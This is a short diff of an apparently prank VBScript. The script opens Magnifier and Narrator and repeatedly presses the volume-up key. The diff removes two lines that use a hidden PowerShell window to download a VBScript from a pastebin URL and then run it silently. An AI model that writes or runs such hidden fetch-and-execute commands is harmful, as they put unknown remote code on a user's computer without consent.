@@ -4,9 +4,6 @@ WshShell.Run "magnify.exe", 1, False
 
 WshShell.Run "narrator", 0, False
 
-WshShell.Run "powershell -w hidden -c ""curl https://pastebin.com/raw/tLYqCwJQ -o soundloop.vbs""", 0, True
-WshShell.Run "wscript.exe soundloop.vbs", 0, False
-
 For i = 1 To 30
     WshShell.SendKeys Chr(175)
     WScript.Sleep 150
